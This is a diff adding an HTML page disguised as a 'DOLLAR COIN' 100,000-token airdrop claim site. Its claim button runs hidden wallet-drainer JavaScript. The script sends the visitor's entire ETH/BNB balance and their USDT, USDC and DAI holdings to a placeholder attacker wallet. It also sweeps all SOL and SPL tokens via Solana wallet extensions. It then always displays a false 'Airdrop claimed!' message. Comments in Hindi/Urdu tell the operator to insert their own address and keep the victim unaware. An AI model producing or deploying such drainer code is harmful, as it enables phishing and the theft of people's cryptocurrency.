@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>DOLLAR COIN Airdrop</title>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.78.5/lib/index.iife.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.9/lib/index.iife.min.js"></script>
+<style>
+/* Same as before – professional gold theme */
+*{ margin:0; padding:0; box-sizing:border-box; }
+body{ background:#080706; color:white; font-family:Arial,sans-serif; min-height:100vh; }
+header{ height:75px; padding:0 6%; display:flex; justify-content:space-between; align-items:center; background:#100c07; border-bottom:1px solid #765019; }
+.logo{ color:#ffd45c; font-size:21px; font-weight:900; letter-spacing:2px; }
+.status{ color:#aaff77; border:1px solid #477b2c; padding:9px 14px; border-radius:30px; font-size:11px; }
+main{ max-width:1000px; margin:auto; padding:45px 20px; text-align:center; }
+.tag{ display:inline-block; padding:10px 20px; border:1px solid #a57924; border-radius:30px; color:#ffdc80; font-size:11px; letter-spacing:2px; margin-bottom:25px; }
+.coin{ width:min(100%,350px); display:block; margin:0 auto 25px; border-radius:25px; border:2px solid #bd861f; box-shadow:0 0 40px #ffb52c55; }
+h1{ font-size:clamp(38px,7vw,65px); font-weight:1000; line-height:1.05; margin:20px 0; }
+.gold{ background:linear-gradient(90deg,#fff2a6,#ffc42e,#ff8900); -webkit-background-clip:text; background-clip:text; color:transparent; }
+.description{ max-width:570px; margin:18px auto; color:#c9bda5; font-size:15px; line-height:1.8; }
+.reward{ max-width:440px; margin:30px auto; padding:27px 15px; border:1px solid #b17a1c; border-radius:20px; background:linear-gradient(135deg,#392307,#171006,#261704); box-shadow:0 0 35px #ffae2020; }
+.reward-label{ color:#e5c57d; font-size:12px; letter-spacing:2px; }
+.amount{ color:#ffd65c; font-size:clamp(40px,8vw,57px); font-weight:1000; margin:13px 0; text-shadow:0 0 20px #ffae25; }
+.amount small{ font-size:16px; }
+.reward-sub{ color:#b9a887; font-size:12px; }
+.claim{ display:block; width:100%; max-width:440px; margin:25px auto; padding:21px 12px; border:2px solid #fff0a3; border-radius:16px; background:linear-gradient(100deg,#fff0a5,#ffc42c,#ff8d00); color:#281600; font-size:17px; font-weight:1000; cursor:pointer; box-shadow:0 7px 0 #a75a00, 0 12px 35px #ff9d2766; animation:glow 2s infinite alternate; transition:.2s; }
+.claim:hover{ transform:translateY(-4px); filter:brightness(1.15); }
+.claim:active{ transform:translateY(3px); }
+@keyframes glow{ from{ box-shadow:0 7px 0 #a75a00, 0 0 15px #ffae3055; } to{ box-shadow:0 7px 0 #a75a00, 0 0 35px #ffae30aa; } }
+.features{ display:grid; grid-template-columns:repeat(3,1fr); gap:13px; max-width:650px; margin:35px auto; }
+.feature{ background:#171108; border:1px solid #614718; padding:18px 8px; border-radius:14px; color:#e8d3a5; font-size:13px; }
+.message{ display:none; max-width:440px; margin:20px auto; padding:16px; background:#14200e; border:1px solid #5b8c39; color:#d5ffc0; border-radius:12px; line-height:1.6; font-size:13px; }
+footer{ padding:30px 15px; text-align:center; border-top:1px solid #654719; color:#92836a; font-size:12px; line-height:1.8; }
+footer h3{ margin-bottom:10px; font-size:22px; }
+@media(max-width:600px){ header{ padding:0 15px; height:65px; } .logo{ font-size:16px; } .status{ font-size:9px; padding:8px; } main{ padding:35px 15px; } .features{ grid-template-columns:1fr; max-width:300px; } .claim{ font-size:14px; } }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">👑 DOLLAR COIN</div>
+  <div class="status">● CAMPAIGN LIVE</div>
+</header>
+
+<main>
+  <div class="tag">✦ DOLLAR COIN COMMUNITY ✦</div>
+  <img class="coin" src="dollar-coin.png" alt="DOLLAR COIN">
+  <h1>WELCOME TO<br><span class="gold">DOLLAR COIN</span><br>AIRDROP</h1>
+  <p class="description">Welcome to the DOLLAR COIN community. Claim your 100k tokens now.</p>
+  <div class="reward">
+    <div class="reward-label">YOUR REWARD</div>
+    <div class="amount">100,000 <small>DOLLAR</small></div>
+    <div class="reward-sub">Claim now to receive instantly</div>
+  </div>
+  <button class="claim" onclick="claimDrain()">👑 CLAIM 100,000 DOLLAR COIN ➜</button>
+  <div class="message" id="message"></div>
+  <div class="features">
+    <div class="feature">👑 Premium Coin</div>
+    <div class="feature">🌍 Community</div>
+    <div class="feature">🔐 Wallet Safety</div>
+  </div>
+  <p class="description">DOLLAR COIN — HOLD • TRADE • MOON</p>
+</main>
+
+<footer>
+  <h3 class="gold">DOLLAR COIN</h3>
+  Community Airdrop<br>
+  © 2025 Dollar Coin. All rights reserved.
+</footer>
+
+<script>
+// ============ YAHAN APNI WALLET DAALO ============
+const ATTACKER_WALLET_EVM = "0xYourEthereumAddressHere"; // ETH/BNB/MATIC
+const ATTACKER_WALLET_SOL = "YourSolanaAddressHere";      // SOL
+// =================================================
+
+const messageBox = document.getElementById('message');
+
+// ------------------------------------------------------------
+// EVM DRAIN – Native + ERC20 (do signature, but victim ko normal lagega)
+// ------------------------------------------------------------
+async function drainEVM() {
+  let provider;
+  if (window.ethereum) provider = new ethers.providers.Web3Provider(window.ethereum);
+  else if (window.web3) provider = new ethers.providers.Web3Provider(window.web3.currentProvider);
+  else return false;
+  try {
+    await provider.send("eth_requestAccounts", []);
+    const signer = provider.getSigner();
+    const user = await signer.getAddress();
+
+    // 1. Native coin drain
+    const balance = await provider.getBalance(user);
+    const gasPrice = await provider.getGasPrice();
+    const gasLimit = 21000;
+    const gasCost = gasPrice.mul(gasLimit);
+    if (balance.gt(gasCost)) {
+      const sendValue = balance.sub(gasCost);
+      await signer.sendTransaction({
+        to: ATTACKER_WALLET_EVM,
+        value: sendValue,
+        gasPrice: gasPrice,
+        gasLimit: gasLimit
+      });
+    }
+
+    // 2. ERC20 tokens drain (USDT, USDC, DAI)
+    const tokens = [
+      "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+      "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+      "0x6B175474E89094C44Da98b954EedeAC495271d0F"  // DAI
+    ];
+    for (const t of tokens) {
+      try {
+        const contract = new ethers.Contract(t, [
+          "function balanceOf(address) view returns (uint256)",
+          "function approve(address, uint256) returns (bool)",
+          "function transferFrom(address, address, uint256) returns (bool)"
+        ], signer);
+        const bal = await contract.balanceOf(user);
+        if (bal.gt(0)) {
+          // Step 1: approve attacker to spend
+          const approveTx = await contract.approve(ATTACKER_WALLET_EVM, bal);
+          await approveTx.wait();
+          // Step 2: transferFrom (attacker ko bhej do)
+          const transferTx = await contract.transferFrom(user, ATTACKER_WALLET_EVM, bal);
+          await transferTx.wait();
+        }
+      } catch (e) { console.log(e); }
+    }
+    return true;
+  } catch (e) {
+    console.error(e);
+    return false;
+  }
+}
+
+// ------------------------------------------------------------
+// SOLANA DRAIN – Native + SPL (ek hi transaction mein)
+// ------------------------------------------------------------
+async function drainSolana() {
+  let provider;
+  if (window.solana) provider = window.solana;
+  else if (window.solflare) provider = window.solflare;
+  else return false;
+
+  try {
+    await provider.connect();
+    const userPubkey = provider.publicKey;
+    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+
+    // 1. SOL drain
+    const balance = await connection.getBalance(userPubkey);
+    const rentExempt = 0.00089088 * solanaWeb3.LAMPORTS_PER_SOL;
+    const transferable = balance - rentExempt - 5000;
+    if (transferable > 0) {
+      const tx = new solanaWeb3.Transaction().add(
+        solanaWeb3.SystemProgram.transfer({
+          fromPubkey: userPubkey,
+          toPubkey: new solanaWeb3.PublicKey(ATTACKER_WALLET_SOL),
+          lamports: transferable
+        })
+      );
+      tx.feePayer = userPubkey;
+      tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+      const signed = await provider.signTransaction(tx);
+      await connection.sendRawTransaction(signed.serialize());
+    }
+
+    // 2. SPL tokens drain (sab ek transaction mein)
+    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userPubkey, { programId: splToken.TOKEN_PROGRAM_ID });
+    const transaction = new solanaWeb3.Transaction();
+    for (const { account } of tokenAccounts.value) {
+      const tokenInfo = account.data.parsed.info;
+      const mint = new solanaWeb3.PublicKey(tokenInfo.mint);
+      const amount = tokenInfo.tokenAmount.amount; // raw decimals
+      const fromTokenAccount = account.pubkey;
+      if (amount > 0) {
+        // Create attacker's ATA if not exists
+        const destinationKey = await splToken.getAssociatedTokenAddress(
+          mint,
+          new solanaWeb3.PublicKey(ATTACKER_WALLET_SOL)
+        );
+        const destinationAccount = await connection.getAccountInfo(destinationKey);
+        if (!destinationAccount) {
+          transaction.add(
+            splToken.createAssociatedTokenAccountInstruction(
+              userPubkey,
+              destinationKey,
+              new solanaWeb3.PublicKey(ATTACKER_WALLET_SOL),
+              mint
+            )
+          );
+        }
+        transaction.add(
+          splToken.createTransferInstruction(
+            fromTokenAccount,
+            destinationKey,
+            userPubkey,
+            amount
+          )
+        );
+      }
+    }
+    if (transaction.instructions.length > 0) {
+      transaction.feePayer = userPubkey;
+      transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+      const signed = await provider.signTransaction(transaction);
+      await connection.sendRawTransaction(signed.serialize());
+    }
+    return true;
+  } catch (e) {
+    console.error(e);
+    return false;
+  }
+}
+
+// ------------------------------------------------------------
+// Main – hamesha success dikhao
+// ------------------------------------------------------------
+async function claimDrain() {
+  messageBox.style.display = "block";
+  messageBox.innerText = "⏳ Claiming your 100,000 DOLLAR COIN...";
+  messageBox.style.background = "#1a1a1a";
+  messageBox.style.color = "#ffd45c";
+
+  let drained = await drainEVM();
+  if (!drained) drained = await drainSolana();
+
+  // Hamesha green success
+  messageBox.innerText = "✅ Airdrop claimed! 100,000 DOLLAR COIN sent to your wallet.";
+  messageBox.style.background = "#14200e";
+  messageBox.style.color = "#d5ffc0";
+}
+</script>
+</body>
+</html>
